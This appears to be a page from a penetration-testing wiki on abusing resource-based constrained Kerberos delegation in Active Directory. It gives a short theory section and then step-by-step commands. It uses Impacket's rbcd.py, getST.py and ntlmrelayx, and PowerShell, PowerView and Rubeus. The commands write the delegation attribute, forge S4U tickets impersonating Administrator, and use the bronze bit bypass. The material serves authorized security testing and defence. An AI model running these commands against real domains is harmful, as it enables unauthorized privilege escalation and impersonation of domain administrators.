# (RBCD) Resource-based constrained

## Theory

If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object (e.g. the `GenericWrite` ACE, see [Abusing ACLs](../../dacl/)), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

{% hint style="success" %}
Machine accounts can edit their own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, hence allowing RBCD attacks on relayed machine accounts authentications.
{% endhint %}

For this attack to work, the attacker needs to populate the target attribute with an account having a `ServicePrincipalName` set (needed for Kerberos delegation operations). The usual way to conduct these attacks is to create a computer account, which comes with an SPN set. This is usually possible thanks to a domain-level attribute called [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) that allows regular users to create up to 10 computer accounts. While this "computer account creation + RBCD attack" is the most common exploitation path, doing so with a user account (having at least one SPN) is perfectly feasible.

Then, in order to abuse this, the attacker has to control the account the object's attribute has been populated with (i.e. the account that has an SPN). Using that account's credentials, the attacker can obtain a ticket through `S4U2Self` and `S4U2Proxy` requests, just like constrained delegation with protocol transition.

In the end, an RBCD abuse results in a Service Ticket to authenticate on a target service on behalf of a user. Once the final Service Ticket is obtained, it can be used with [Pass-the-Ticket](../ptt.md) to access the target service.&#x20;

{% hint style="success" %}
On a side note, a technique called [AnySPN or "service class modification"](../ptt.md#modifying-the-spn) can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the `cifs/target.domain.local` SPN, the service class is `cifs`).
{% endhint %}

![](../../../../.gitbook/assets/Kerberos\_delegations-rbcd.png)

{% hint style="info" %}
The `msDS-AllowedToActOnBehalfOfOtherIdentity` was introduced with Windows Server 2012 implying that RBCD only works when the Domain Controller Functionality Level (DCFL) is Windows Server 2012 or higher.
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
**1 - Edit the target's "rbcd" attribute (ACE abuse)** :pencil2: ****&#x20;

[Impacket](https://github.com/SecureAuthCorp/impacket/)'s [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py) script (Python) _c_an be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.

```bash
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action read 'DOMAIN'/'POWERFULUSER':'PASSWORD'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action write 'DOMAIN'/'POWERFULUSER':'PASSWORD'
```

{% hint style="success" %}
Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to set the delegation rights with the `--delegate-access` option when conducting this attack from a [relayed authentication](../../ntlm/relay.md).
{% endhint %}

**2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;

Once the attribute has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).

```bash
getST.py -spn "cifs/target" -impersonate Administrator -dc-ip $DomainController 'DOMAIN/controlledaccountwithSPN:SomePassword'
```

{% hint style="warning" %}
In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `-force-forwardable` option to try to bypass restrictions.
{% endhint %}

{% hint style="info" %}
The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more service. This technique is automatically tried by Impacket scripts when doing pass-the-ticket.
{% endhint %}

**3 - Pass-the-ticket** :passport\_control: ****&#x20;

Once the ticket is obtained, it can be used with [pass-the-ticket](../ptt.md).
{% endtab %}

{% tab title="Windows" %}
In order to run the following commands and tools as other users, testers can check the [user impersonation](../../credentials/impersonation.md) part.

**1 - Edit the target's security descriptor (ACE abuse)**:pencil2: ****&#x20;

The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps)'s cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object (in this case, to modify the delegation rights).

```bash
# Read the security descriptor
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount

# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
```

PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html?highlight=genericall#id31)).

```bash
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid

# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;

[Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the TGT and "impersonation ST" and inject it for later use.

```powershell
# Request the TGT
Rubeus.exe tgtdeleg /nowrap

# Request the "impersonation" service ticke
Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
```

The NT hash can be computed as follows.

```bash
Rubeus.exe hash /password:$password
```

{% hint style="warning" %}
In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `/bronzebit` flag to try to bypass restrictions.
{% endhint %}

{% hint style="info" %}
The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)). There however scenarios where the SPN can be changed ([AnySPN](../ptt.md#modifying-the-spn)) to access more service**s**. This technique can be exploited with the `/altservice` flag with Rubeus.
{% endhint %}

**3 - Pass-the-ticket** :passport\_control: ****&#x20;

Once the ticket is injected, it can natively be used when accessing the service (see [pass-the-ticket](../ptt.md)).
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" %}

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" %}

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/" %}
